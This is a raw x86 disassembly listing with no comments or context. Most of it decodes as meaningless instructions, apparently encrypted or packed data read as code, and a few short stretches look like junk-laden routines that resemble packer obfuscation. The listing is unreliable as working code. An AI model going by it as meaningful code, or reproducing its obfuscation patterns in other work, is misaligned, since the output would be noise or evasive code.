  40d297:	xlat   BYTE PTR ds:[ebx]
  40d298:	or     eax,0x3799bdf2
  40d29d:	jmp    0x40d299
  40d29f:	(bad)  
  40d2a0:	sub    al,BYTE PTR [ecx]
  40d2a2:	out    0x4c,al
  40d2a4:	int    0x3b
  40d2a6:	call   0xc1baba4
  40d2ab:	int3   
  40d2ac:	push   ebx
  40d2ad:	loope  0x40d2f1
  40d2af:	fst    QWORD PTR ds:0xb6e19bde
  40d2b5:	int3   
  40d2b6:	ds xchg ecx,eax
  40d2b8:	xchg   edi,eax
  40d2b9:	xchg   edx,eax
  40d2ba:	inc    eax
  40d2bb:	inc    esp
  40d2bc:	js     0x40d336
  40d2be:	adc    ebp,DWORD PTR [edi]
  40d2c0:	cdq    
  40d2c1:	test   al,0xf1
  40d2c3:	lock dec ebp
  40d2c5:	bound  eax,QWORD PTR [edi+edi*4]
  40d2c8:	ds outs dx,BYTE PTR fs:[esi]
  40d2cb:	and    edi,eax
  40d2cd:	xor    al,0x23
  40d2cf:	mov    ebp,0x7bac5866
  40d2d4:	sbb    eax,0x9ec714f
  40d2d9:	xchg   edx,eax
  40d2da:	sub    BYTE PTR [eax-0x34],dl
  40d2dd:	and    eax,0x4ecf6446
  40d2e2:	sbb    al,0x3c
  40d2e4:	adc    DWORD PTR [ecx],edx
  40d2e6:	nop
  40d2e7:	fcmovb st,st(1)
  40d2e9:	aam    0x7f
  40d2eb:	aad    0x69
  40d2ed:	fistp  WORD PTR [esp+esi*4-0x53]
  40d2f1:	mov    WORD PTR [edx+edi*8-0x25],fs
  40d2f5:	stos   DWORD PTR es:[edi],eax
  40d2f6:	mov    edx,0x90219ca6
  40d2fb:	aas    
  40d2fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2fd:	push   cs
  40d2fe:	sti    
  40d2ff:	in     eax,dx
  40d300:	sbb    BYTE PTR [ecx],al
  40d302:	repnz pop ecx
  40d304:	mov    bh,0x4e
  40d306:	rcr    DWORD PTR [esi+0x7b],1
  40d309:	jp     0x40d301
  40d30b:	adc    al,0xdd
  40d30d:	test   BYTE PTR [eax+0x3d],dh
  40d310:	jp     0x40d2f0
  40d312:	les    edx,FWORD PTR [edi+0x5fa8426c]
  40d318:	mov    esp,tr1
  40d31b:	xchg   edi,eax
  40d31c:	pushf  
  40d31d:	test   BYTE PTR [edi+0x3350446b],bh
  40d323:	fisttp DWORD PTR [ebx+0x5ee94ad4]
  40d329:	add    al,BYTE PTR [eax]
  40d32b:	add    BYTE PTR [ebx-0x4cd54cfa],bl
  40d331:	stos   DWORD PTR es:[edi],eax
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	fld    DWORD PTR [ecx+0x55]
  40d33b:	cmp    BYTE PTR [eax+0x387e7e97],dh
  40d341:	jl     0x40d3c1
  40d343:	jle    0x40d334
  40d345:	in     al,0x73
  40d347:	add    DWORD PTR [eax+0x1e995058],ebx
  40d34d:	xchg   ecx,eax
  40d34e:	out    dx,eax
  40d34f:	jne    0x40d317
  40d351:	jmp    0x40d31f
  40d353:	in     al,dx
  40d354:	in     eax,0x5f
  40d356:	mov    ebx,DWORD PTR [edi-0x5b]
  40d359:	mov    bh,0x36
  40d35b:	xlat   BYTE PTR ds:[ebx]
  40d35c:	data16 sub bl,dh
  40d35f:	int    0xc1
  40d361:	fsubr  QWORD PTR [eax+0x4d460989]
  40d367:	js     0x40d34a
  40d369:	mov    ah,0x89
  40d36b:	push   ecx
  40d36c:	rcl    BYTE PTR [edi+0x7d],1
  40d36f:	adc    al,al
  40d371:	xor    cl,BYTE PTR [esi]
  40d373:	and    edx,DWORD PTR [edi]
  40d375:	shl    DWORD PTR [esi],0x4
  40d378:	ret    
  40d379:	jl     0x40d334
  40d37b:	sub    DWORD PTR [edi],esi
  40d37d:	sti    
  40d37e:	add    DWORD PTR [edi+0x4966174d],ebp
  40d384:	(bad)  
  40d385:	mov    ecx,0x3ceede18
  40d38a:	aaa    
  40d38b:	mov    esi,eax
  40d38d:	mov    bl,0x82
  40d38f:	inc    ecx
  40d390:	pop    ds
  40d391:	imul   ecx,DWORD PTR [eax-0x5fdbd47f],0xffffffe2
  40d398:	sbb    DWORD PTR [edx+0x54],esi
  40d39b:	retf   
  40d39c:	push   ds
  40d39d:	cmp    eax,0x44f22c89
  40d3a2:	sbb    eax,0x30fb3cdc
  40d3a7:	lock mov esi,0xd2f3fa65
  40d3ad:	cdq    
  40d3ae:	ror    DWORD PTR [ebp+ebx*1-0x398ad329],0xb5
  40d3b6:	cli    
  40d3b7:	imul   eax,DWORD PTR [edi+0x77],0xabcd8478
  40d3be:	outs   dx,DWORD PTR ds:[esi]
  40d3bf:	mov    esi,ss
  40d3c1:	lahf   
  40d3c2:	mov    bl,0xd3
  40d3c4:	sbb    eax,0x953dc03c
  40d3c9:	pop    ebp
  40d3ca:	stos   DWORD PTR es:[edi],eax
  40d3cb:	scas   eax,DWORD PTR es:[edi]
  40d3cc:	(bad)  
  40d3cd:	fimul  DWORD PTR [edi]
  40d3cf:	fist   DWORD PTR ds:0x11b66a29
  40d3d5:	cmp    BYTE PTR [ecx+ecx*1],ah
  40d3d8:	and    dl,BYTE PTR [edx]
  40d3da:	mov    esp,DWORD PTR [eax-0x3ea2229d]
  40d3e0:	jmp    0x40d3c0
  40d3e2:	repz push 0x1b523c83
  40d3e8:	fsub   st(4),st
  40d3ea:	out    dx,eax
  40d3eb:	add    al,0x34
  40d3ed:	dec    esi
  40d3ee:	mov    edi,0x514ed824
  40d3f3:	in     eax,dx
  40d3f4:	ja     0x40d413
  40d3f6:	daa    
  40d3f7:	xor    al,0x5f
  40d3f9:	or     ecx,DWORD PTR [ebx-0x2e]
  40d3fc:	cmp    eax,0xb459bf11
  40d401:	enter  0x8574,0xdb
  40d405:	inc    esp
  40d406:	inc    ebx
  40d407:	cmp    edx,DWORD PTR [ebx-0x68]
  40d40a:	out    dx,eax
  40d40b:	ins    BYTE PTR es:[edi],dx
  40d40c:	xor    cl,0x72
  40d40f:	and    dl,BYTE PTR [esp+edx*8]
  40d412:	add    ch,BYTE PTR [esi-0x6f8ca193]
  40d418:	or     ebx,DWORD PTR [esi]
  40d41a:	cmp    BYTE PTR [esi-0x5a],dh
  40d41d:	inc    eax
  40d41e:	push   ds
  40d41f:	dec    ecx
  40d420:	sub    cl,BYTE PTR [ebp+0x5f]
  40d423:	aam    0xc2
  40d425:	ret    0xf6ab
  40d428:	mov    bl,dh
  40d42a:	mov    esi,0x8b20aae2
  40d42f:	or     cl,BYTE PTR [ecx-0x57]
  40d432:	(bad)  
  40d433:	adc    BYTE PTR [ebx-0x6eb427cf],bl
  40d439:	int3   
  40d43a:	imul   eax,DWORD PTR [ecx-0x7f9c7cda],0xac5b0b92
  40d444:	test   eax,0x3c797d5f
  40d449:	or     edi,DWORD PTR ds:0x98d5fb77
  40d44f:	test   DWORD PTR [esi+0x9a50479],0xd28eb967
  40d459:	and    DWORD PTR [edx+0x7d],ebp
  40d45c:	inc    esi
  40d45d:	pop    esi
  40d45e:	jb     0x40d487
  40d460:	out    0xc7,al
  40d462:	xchg   edi,eax
  40d463:	retf   0x9f64
  40d466:	adc    eax,0x63ab545
  40d46b:	arpl   WORD PTR [eax],si
  40d46d:	mov    al,ds:0x83487b3
  40d472:	push   0x73
  40d474:	pop    ebp
  40d475:	cmp    ecx,0x3070bfad
  40d47b:	data16 hlt 
  40d47d:	or     eax,DWORD PTR [edi+0x45]
  40d480:	ret    
  40d481:	mov    ds:0xe0669382,eax
  40d486:	mov    BYTE PTR [ebx-0x603713ad],bl
  40d48c:	xchg   esp,eax
  40d48d:	add    ebx,DWORD PTR [ebx]
  40d48f:	or     al,0xb4
  40d491:	mov    dh,BYTE PTR [ecx]
  40d493:	cwde   
  40d494:	test   BYTE PTR [eax],ch
  40d496:	sub    al,0xeb
  40d498:	cmc    
  40d499:	hlt    
  40d49a:	push   esi
  40d49b:	cmp    DWORD PTR [edi],0xffffffa2
  40d49e:	stc    
  40d49f:	jle    0x40d47f
  40d4a1:	rcl    DWORD PTR [esi+0x4e],0x23
  40d4a5:	jmp    0x376bfa83
  40d4aa:	xchg   esp,eax
  40d4ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4ac:	jno    0x40d514
  40d4ae:	inc    edx
  40d4af:	mov    dl,0x17
  40d4b1:	mov    esi,0x46ec7c64
  40d4b6:	ins    DWORD PTR es:[edi],dx
  40d4b7:	and    esi,DWORD PTR [esi+eax*2+0x737b2212]
  40d4be:	sub    BYTE PTR [edi-0x24d3ffd6],dl
  40d4c4:	mov    ch,0xf7
  40d4c6:	mov    ebx,0x187b2058
  40d4cb:	cmp    BYTE PTR [eax],al
  40d4cd:	inc    esi
  40d4ce:	jb     0x40d47d
  40d4d0:	pop    es
  40d4d1:	enter  0x5d64,0xd8
  40d4d5:	cmp    eax,0x7f660d12
  40d4da:	mov    dh,0xf0
  40d4dc:	ss ss imul esi,ebx,0xca108c99
  40d4e4:	test   DWORD PTR [edi-0x77910d73],esi
  40d4ea:	in     eax,dx
  40d4eb:	fbld   TBYTE PTR [ebp-0x764ee25d]
  40d4f1:	jmp    0x39c58fae
  40d4f6:	inc    edi
  40d4f7:	ror    DWORD PTR [esi+0x40],1
  40d4fa:	xchg   BYTE PTR [ecx],bh
  40d4fc:	push   edi
  40d4fd:	and    al,0x88
  40d4ff:	or     bl,BYTE PTR [ecx+0x0]
  40d502:	mov    ch,0xc5
  40d504:	(bad)  
  40d506:	or     DWORD PTR [eax],0x32
  40d509:	mov    ah,0x81
  40d50b:	dec    edx
  40d50c:	dec    ebx
  40d50d:	leave  
  40d50e:	es or  esp,ecx
  40d511:	out    0x92,eax
  40d513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d514:	sub    eax,0x303094b1
  40d519:	fisttp WORD PTR ss:[esi+0x6c]
  40d51d:	sbb    al,0x64
  40d51f:	bound  ecx,QWORD PTR [edi]
  40d521:	cmp    al,0xbe
  40d523:	stos   DWORD PTR es:[edi],eax
  40d524:	pop    ebx
  40d525:	mov    BYTE PTR [esi],ah
  40d527:	(bad)  
  40d528:	shr    ch,1
  40d52a:	arpl   WORD PTR [eax+0x49],dx
  40d52d:	lock jmp 0xebb7:0x45206f5e
  40d535:	sbb    ch,ah
  40d537:	std    
  40d538:	or     DWORD PTR [ebx],ebx
  40d53a:	daa    
  40d53b:	push   esi
  40d53c:	shl    BYTE PTR [eax+0x490e7ed1],1
  40d542:	or     ebx,DWORD PTR [eax]
  40d544:	inc    DWORD PTR [ecx+0x4c896863]
  40d54a:	push   esi
  40d54b:	pop    eax
  40d54c:	retf   
  40d54d:	call   0x7df5:0x46d9ddec
  40d554:	loopne 0x40d5bf
  40d556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d557:	mov    WORD PTR [ecx],es
  40d559:	in     eax,0x7e
  40d55b:	bound  esp,QWORD PTR [edi-0x25513245]
  40d561:	int    0x7a
  40d563:	dec    ebx
  40d564:	xchg   ebp,eax
  40d565:	and    BYTE PTR [esi+0x22],bh
  40d568:	outs   dx,DWORD PTR ds:[esi]
  40d569:	xor    DWORD PTR [edi+edx*2-0x46],edi
  40d56d:	mov    dh,0x64
  40d56f:	push   edi
  40d570:	and    bl,cl
  40d572:	sbb    DWORD PTR [edi],ecx
  40d574:	dec    esp
  40d575:	add    al,0x27
  40d577:	popa   
  40d578:	in     al,dx
  40d579:	or     bl,BYTE PTR [ebp-0x6d19c14]
  40d57f:	jne    0x40d5a9
  40d581:	mov    edx,0x17050397
  40d586:	sbb    ah,BYTE PTR [ecx+0x3437c69]
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4337a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433797,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43379b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4337a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4337e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43379b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433827,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43382f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43375b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4337db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433817,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433817
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433817,edx
  40d64f:	cmp    DWORD PTR ds:0x433817,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433817,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433763,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433763
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433763,edx
  40d68b:	cmp    DWORD PTR ds:0x433763,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433853
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433763,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433767
  40d6b7:	add    eax,DWORD PTR ds:0x43379b
  40d6bd:	mov    ds:0x433767,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x5ba0482a
  40d6f9:	jp     0x40d687
  40d6fb:	dec    eax
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d68f
  40d705:	(bad)  
  40d707:	adc    BYTE PTR [ecx-0x18],cl
  40d70a:	lahf   
  40d70b:	xor    dh,BYTE PTR [edx+0x60]
  40d70e:	xchg   esp,eax
  40d70f:	pop    ds
  40d710:	jge    0x40d6cb
  40d712:	push   edx
  40d713:	mov    al,0xe6
  40d715:	push   ecx
  40d716:	retf   0x85f7
  40d719:	mov    eax,ds:0xdbe4e95b
  40d71e:	push   ds
  40d71f:	inc    ebp
  40d720:	sbb    edx,0xffffffe8
  40d723:	jbe    0x40d6fb
  40d725:	and    bh,BYTE PTR [edi-0x17]
  40d728:	div    DWORD PTR [ebx+0x7b]
  40d72b:	scas   al,BYTE PTR es:[edi]
  40d72c:	cmp    edi,eax
  40d72e:	xor    eax,0x30d2dc37
  40d733:	aaa    
  40d734:	pop    esi
  40d735:	xor    BYTE PTR [ebp+esi*4+0x73],bl
  40d739:	sub    cl,al
  40d73b:	or     al,0x1d
  40d73d:	into   
  40d73e:	out    dx,al
  40d73f:	aas    
  40d740:	fwait
  40d741:	std    
  40d742:	add    eax,0x4cdbba0c
  40d747:	mov    ds:0xd2159142,al
  40d74c:	jp     0x40d6d5
  40d74e:	xor    BYTE PTR [edi+0xb],dl
  40d751:	push   esi
  40d752:	mov    dh,cl
  40d754:	je     0x40d763
  40d756:	leave  
  40d757:	jmp    0x40d777
  40d759:	adc    cl,BYTE PTR [ebp+0x6a]
  40d75c:	push   ecx
  40d75d:	sti    
  40d75e:	xchg   esi,eax
  40d75f:	xchg   esp,eax
  40d760:	(bad)  
  40d761:	dec    eax
  40d762:	xchg   ecx,eax
  40d763:	push   ds
  40d764:	xchg   edx,eax
  40d765:	sbb    DWORD PTR [eax-0x420795ea],eax
  40d76b:	scas   al,BYTE PTR es:[edi]
  40d76c:	adc    ecx,0xffffffdd
  40d76f:	or     bl,BYTE PTR [ebp-0x5d]
  40d772:	mov    esp,0x66e5380
  40d777:	(bad)  
  40d778:	mov    fs,WORD PTR [ebx-0x252390c2]
  40d77e:	xor    DWORD PTR [esi],edx
  40d780:	mov    edi,0x146022ff
  40d785:	cmp    DWORD PTR [ebx-0x21fd3096],ecx
  40d78b:	adc    BYTE PTR [edx+0x38],bh
  40d78e:	mov    ebx,0xd1981784
  40d793:	xor    DWORD PTR [edi+ecx*4-0x26febc78],eax
  40d79a:	(bad)  
  40d79b:	xlat   BYTE PTR ds:[ebx]
  40d79c:	ror    BYTE PTR [esi-0x66],cl
  40d79f:	mov    bh,BYTE PTR [ecx-0x2931ba28]
  40d7a5:	or     dh,BYTE PTR [edx]
  40d7a7:	xchg   edi,eax
  40d7a8:	into   
  40d7a9:	ret    0xf6ce
  40d7ac:	push   edx
  40d7ad:	and    eax,DWORD PTR [ebx+0x24]
  40d7b0:	les    ebp,FWORD PTR [ebx]
  40d7b2:	dec    ecx
  40d7b3:	ja     0x40d799
  40d7b5:	inc    eax
  40d7b6:	jae    0x40d7eb
  40d7b8:	and    DWORD PTR [ebp-0x76],edx
  40d7bb:	jnp    0x40d7f5
  40d7bd:	cwde   
  40d7be:	sahf   
  40d7bf:	pop    ebx
  40d7c0:	add    dh,BYTE PTR [edi+0x50be0f25]
  40d7c6:	mov    edx,0xba4d5406
  40d7cb:	add    eax,0x2f7c75fd
  40d7d0:	pop    es
  40d7d1:	mov    BYTE PTR [edi+0x4cda555a],ch
  40d7d7:	fist   DWORD PTR [edx]
  40d7d9:	test   al,0x3f
  40d7db:	in     al,0x83
  40d7dd:	jmp    DWORD PTR [ebp+0x70485806]
  40d7e3:	xor    BYTE PTR [esi-0x1112d231],dl
  40d7e9:	mov    WORD PTR [esi-0x60984e51],fs
  40d7ef:	outs   dx,DWORD PTR ds:[esi]
  40d7f0:	mov    cl,0x30
  40d7f2:	cmp    DWORD PTR [ebx],ecx
  40d7f4:	daa    
  40d7f5:	hlt    
  40d7f6:	inc    BYTE PTR [ebx-0x21da7cc5]
  40d7fc:	xlat   BYTE PTR ds:[ebx]
  40d7fd:	push   cs
  40d7fe:	adc    BYTE PTR [eax+0x53],ah
  40d801:	repnz mov ds,WORD PTR [ecx+0x49ce0c0b]
  40d808:	mov    ebp,0x8b41dcf2
  40d80d:	or     BYTE PTR [eax+edx*2],al
  40d810:	xchg   esi,eax
  40d811:	jle    0x40d838
  40d813:	push   eax
  40d814:	fsubr  QWORD PTR [ebx]
  40d816:	jmp    0x40d7c1
  40d818:	jmp    DWORD PTR [eax+0x1a1dfa3a]
  40d81e:	in     eax,dx
  40d81f:	outs   dx,DWORD PTR gs:[esi]
  40d821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d822:	and    BYTE PTR [edi],dh
  40d824:	and    al,0x1
  40d826:	ja     0x40d80d
  40d828:	sub    BYTE PTR [esi+0x18],0xb4
  40d82c:	(bad)  
  40d82d:	out    0xa3,eax
  40d82f:	push   ebp
  40d830:	mov    esi,0xd32a41e6
  40d835:	fcom   DWORD PTR [ebx]
  40d837:	in     al,dx
  40d838:	pop    edi
  40d839:	sbb    eax,0x3b2adb29
  40d83e:	sbb    DWORD PTR [eax-0x54],esp
  40d841:	sub    eax,edi
  40d843:	loop   0x40d810
  40d845:	in     eax,dx
  40d846:	loope  0x40d87e
  40d848:	jp     0x40d868
  40d84a:	xor    DWORD PTR [ebp+0x51],ebp
  40d84d:	js     0x40d835
  40d84f:	cld    
  40d850:	sbb    bl,BYTE PTR [eax-0x1f178800]
  40d856:	ds pop ss
  40d858:	fild   WORD PTR [edx+0x74]
  40d85b:	push   esp
  40d85c:	mov    dl,0xb
  40d85e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d85f:	ins    BYTE PTR es:[edi],dx
  40d860:	pop    eax
  40d861:	int    0x18
  40d863:	cmp    eax,DWORD PTR [ebx+0x3ff973d9]
  40d869:	cmp    eax,0x67f97d71
  40d86e:	pop    esp
  40d86f:	iret   
  40d870:	xchg   ebx,ecx
  40d872:	dec    ecx
  40d873:	pushf  
  40d874:	hlt    
  40d875:	and    edx,DWORD PTR [ecx+ecx*4+0x540b7136]
  40d87c:	mov    ecx,0xc0023ae2
  40d881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d882:	out    dx,eax
  40d883:	(bad)  
  40d884:	inc    eax
  40d885:	ret    
  40d886:	cmp    DWORD PTR [ebx-0x3bc3ff7],0x65
  40d88d:	xchg   esp,eax
  40d88e:	pop    ss
  40d88f:	inc    eax
  40d890:	xchg   BYTE PTR [edi+0x5351f636],ah
  40d896:	popf   
  40d897:	out    dx,al
  40d898:	stc    
  40d899:	pop    edx
  40d89a:	push   ss
  40d89b:	dec    ecx
  40d89c:	push   ecx
  40d89d:	fld    TBYTE PTR [ebp+0x43]
  40d8a0:	nop
  40d8a1:	call   0x99ef:0xed8d
  40d8a7:	das    
  40d8a8:	(bad)  
  40d8a9:	(bad)  
  40d8aa:	dec    edi
  40d8ab:	and    eax,DWORD PTR ds:0x94f58ea8
  40d8b1:	jl     0x40d841
  40d8b3:	jecxz  0x40d886
  40d8b5:	add    esp,DWORD PTR [ebx-0x110b4ac3]
  40d8bb:	into   
  40d8bc:	sbb    dh,ch
  40d8be:	mov    WORD PTR [esi],?
  40d8c0:	inc    edx
  40d8c1:	scas   eax,DWORD PTR es:[edi]
  40d8c2:	xor    al,0x34
  40d8c4:	dec    eax
  40d8c5:	mov    ebp,ss
  40d8c7:	int3   
  40d8c8:	xor    al,0xd9
  40d8ca:	dec    edi
  40d8cb:	arpl   bp,ax
  40d8cd:	cmp    edi,edi
  40d8cf:	cmp    al,0x8e
  40d8d1:	adc    al,0xd2
  40d8d3:	jg     0x40d94b
  40d8d5:	das    
  40d8d6:	rol    BYTE PTR [ecx+edx*1-0x20],cl
  40d8da:	and    ch,bh
  40d8dc:	fcomp  DWORD PTR [ecx+0xe]
  40d8df:	xor    eax,0x9183aada
  40d8e4:	pushf  
  40d8e5:	or     BYTE PTR ds:0xc1e9fb6f,dl
  40d8eb:	cld    
  40d8ec:	dec    esp
  40d8ed:	(bad)  
  40d8ee:	pop    esp
  40d8ef:	mov    esp,0xd0c79fec
  40d8f4:	inc    edi
  40d8f5:	ins    DWORD PTR es:[edi],dx
  40d8f6:	inc    ecx
  40d8f7:	fldcw  WORD PTR [edi-0xd]
  40d8fb:	call   FWORD PTR [eax-0x4f90b0ba]
  40d901:	hlt    
  40d902:	bound  edx,QWORD PTR fs:[edx]
  40d905:	ret    
  40d906:	ud2    
  40d908:	rcr    BYTE PTR [ebp-0x3f],1
  40d90b:	aas    
  40d90c:	jae    0x40d8ae
  40d90e:	(bad)  
  40d90f:	push   ebx
  40d910:	inc    ebx
  40d911:	and    eax,esi
  40d913:	lahf   
  40d914:	or     DWORD PTR [eax+0xdf656de],edx
  40d91a:	fist   WORD PTR [esp+edx*2-0x75]
  40d91e:	xchg   esi,eax
  40d91f:	sub    esi,DWORD PTR ds:0x1e09fe82
  40d925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d926:	aad    0x3c
  40d928:	adc    bl,al
  40d92a:	jecxz  0x40d8f4
  40d92c:	mov    eax,DWORD PTR [ebx]
  40d92e:	push   ebp
  40d92f:	je     0x40d8db
  40d931:	mov    es,WORD PTR [ebx+0x2d]
  40d934:	xchg   edx,eax
  40d935:	adc    DWORD PTR [edi-0x19],eax
  40d938:	xchg   ecx,eax
  40d939:	mov    ch,0xf1
  40d93b:	sub    al,0xd4
  40d93d:	cli    
  40d93e:	adc    ebp,DWORD PTR [edi-0x5b]
  40d941:	frndint 
  40d943:	push   ecx
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x6a2b51ed
  40d96a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d96b:	sahf   
  40d96c:	jbe    0x40d9a8
  40d96e:	nop
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d93d
  40d976:	add    ebx,DWORD PTR [edx+0x37]
  40d979:	je     0x40d989
  40d97b:	sub    eax,0x849eab22
  40d980:	int    0xd2
  40d982:	daa    
  40d983:	test   al,0x3e
  40d986:	lods   eax,DWORD PTR ds:[esi]
  40d987:	enter  0x8987,0x6f
  40d98b:	sbb    eax,0x6dc9e57a
  40d990:	fdivr  QWORD PTR [esi+0x2f9b37bb]
  40d996:	jns    0x40da00
  40d998:	mov    ebx,edi
  40d99a:	sbb    cl,BYTE PTR [ebp+0x29]
  40d99d:	std    
  40d99e:	add    BYTE PTR [edi-0x2b72690a],dh
  40d9a4:	pop    es
  40d9a5:	adc    esp,0xffffff94
  40d9a8:	cli    
  40d9a9:	out    0x6d,eax
  40d9ab:	adc    ah,BYTE PTR [edi-0x5a186d30]
  40d9b1:	mov    dl,0x59
  40d9b3:	gs das 
  40d9b5:	sbb    al,0xe7
  40d9b7:	loop   0x40d9f4
  40d9b9:	in     al,dx
  40d9ba:	out    dx,al
  40d9bb:	sbb    esp,0x34d31f35
  40d9c1:	jo     0x40d96c
  40d9c3:	imul   ebp,edi,0x3c03997d
  40d9c9:	fmul   DWORD PTR cs:[eax+0x24093fdd]
  40d9d0:	cld    
  40d9d1:	sbb    dl,0x77
  40d9d4:	xchg   esp,eax
  40d9d5:	gs mov ebx,0x2395bb5d
  40d9db:	adc    al,0x25
  40d9dd:	aam    0xac
  40d9df:	out    dx,eax
  40d9e0:	pusha  
  40d9e1:	jne    0x40da56
  40d9e3:	mov    edx,0xf827ce96
  40d9e8:	mov    ebp,0x131921ec
  40d9ed:	mov    esp,0xb07d9e77
  40d9f2:	sub    BYTE PTR [ebp+0x53d30ffc],bh
  40d9f8:	fimul  DWORD PTR [ecx+0x62c64228]
  40d9fe:	or     ebx,DWORD PTR [eax+0x2d9fcbd6]
  40da04:	mov    esp,0x5436b42d
  40da09:	mov    esi,0x566cca3a
  40da0e:	sbb    esi,esp
  40da10:	cmp    al,0xb0
  40da12:	sbb    eax,0xfebe57c7
  40da17:	in     al,0xa5
  40da19:	shl    BYTE PTR [edx],cl
  40da1b:	hlt    
  40da1c:	pop    edi
  40da1d:	imul   esi,DWORD PTR [edx+0xe74bb36],0x52
  40da24:	aam    0xc6
  40da26:	dec    esi
  40da27:	sub    eax,0xce01be1d
  40da2c:	std    
  40da2d:	daa    
  40da2e:	pop    ss
  40da2f:	add    al,ch
  40da31:	xlat   BYTE PTR ds:[ebx]
  40da32:	cs retf 
  40da34:	gs or  eax,0x2c3121ff
  40da3a:	pop    ss
  40da3b:	icebp  
  40da3c:	or     BYTE PTR [edx+ebp*4-0x53eaa055],ch
  40da43:	ins    DWORD PTR es:[edi],dx
  40da44:	js     0x40d9d2
  40da46:	cmp    edi,eax
  40da48:	inc    esp
  40da49:	mov    edi,0xee42fbe8
  40da4e:	out    dx,eax
  40da4f:	jmp    0x40d9d8
  40da51:	mov    al,ds:0xd8a8574b
  40da56:	mov    edi,0xf24b6afa
  40da5b:	not    BYTE PTR [eax+0x2f]
  40da5e:	dec    ebp
  40da5f:	jecxz  0x40da65
  40da61:	adc    DWORD PTR fs:[edx+0x3f],ebp
  40da65:	daa    
  40da66:	test   al,0xff
  40da68:	mov    al,ds:0x73852939
  40da6d:	test   al,0x7c
  40da6f:	pushf  
  40da70:	mov    ch,0x69
  40da72:	iret   
  40da73:	hlt    
  40da74:	dec    esp
  40da75:	enter  0xd2e5,0xa6
  40da79:	sbb    al,0x3d
  40da7b:	fldenv [eax-0x75]
  40da7e:	inc    esp
  40da7f:	jmp    0x6de:0xc8d1d466
  40da86:	ins    DWORD PTR es:[edi],dx
  40da87:	push   eax
  40da88:	rcr    BYTE PTR [ebx*2-0x709c17d],1
  40da8f:	or     BYTE PTR [ebx],dh
  40da91:	sub    ebp,eax
  40da93:	jns    0x40da33
  40da95:	popa   
  40da96:	sbb    bh,0xf5
  40da99:	daa    
  40da9a:	adc    BYTE PTR [edx],ch
